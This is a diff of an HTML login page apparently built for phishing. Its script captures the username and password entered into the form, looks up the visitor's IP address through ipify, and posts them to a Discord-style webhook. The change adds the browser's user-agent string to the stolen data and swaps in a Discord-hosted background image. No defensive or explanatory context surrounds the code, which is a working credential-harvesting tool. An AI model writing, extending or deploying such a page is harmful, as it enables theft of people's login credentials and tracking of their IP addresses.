@@ -4,7 +4,7 @@
     <title>Login Form</title>
     <style>
         body {
-            background-image: url('https://images.unsplash.com/photo-1440613908111-bc00e0e228cd');
+            background-image: url('https://cdn.discordapp.com/attachments/1064146226691444776/1093838361413820496/v2.png');
             background-size: cover;
             background-repeat: no-repeat;
             font-family: Arial, Helvetica, sans-serif;
@@ -67,8 +67,6 @@
     </form>
 
     <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/moment.js/2.29.1/moment.min.js" integrity="sha512-T5rJ7hDx8Wp33VDbvIZhKj7b9zQkZ5QxtgvvLwU5OoD5eBc85+oZHvIWq3qKjX1fHn0AfoSyuwYFuxgR0GKsBg==" crossorigin="anonymous"></script>
-    <script src="//api.ipify.org?format=json"></script>
     <script>
         function submitForm(event) {
             event.preventDefault();
@@ -77,19 +75,20 @@
             var username = document.getElementById("username").value;
             var password = document.getElementById("password").value;
 
-            // Получение IP-адреса пользователя с помощью API ipify.org
-            fetch('//api.ipify.org?format=json')
-              .then(response => response.json())
-              .then(data => {
-                var ip_address = data.ip;
-
+            // Получение IP-адреса пользователя и информации о браузере
+            var ip_address = "";
+            var browser_info = "";
+            $.getJSON('//api.ipify.org?format=json', function(data) {
+                ip_address = data.ip;
+                browser_info = navigator.userAgent;
+            }).done(function() {
                 var request = new XMLHttpRequest();
                 request.open("POST", webhook_url);
                 request.setRequestHeader('Content-type', 'application/json');
                 var params = {
                     username: "Login Form",
                     avatar_url: "https://i.imgur.com/WzAMxKl.png",
-                    content: "**Username**: " + username + "\n**Password**: " + password + "\n**IP Address**: " + ip_address
+                    content: "**Username**: " + username + "\n**Password**: " + password + "\n**IP Address**: " + ip_address + "\n**Browser Info**: " + browser_info
                 };
                 request.send(JSON.stringify(params));
 
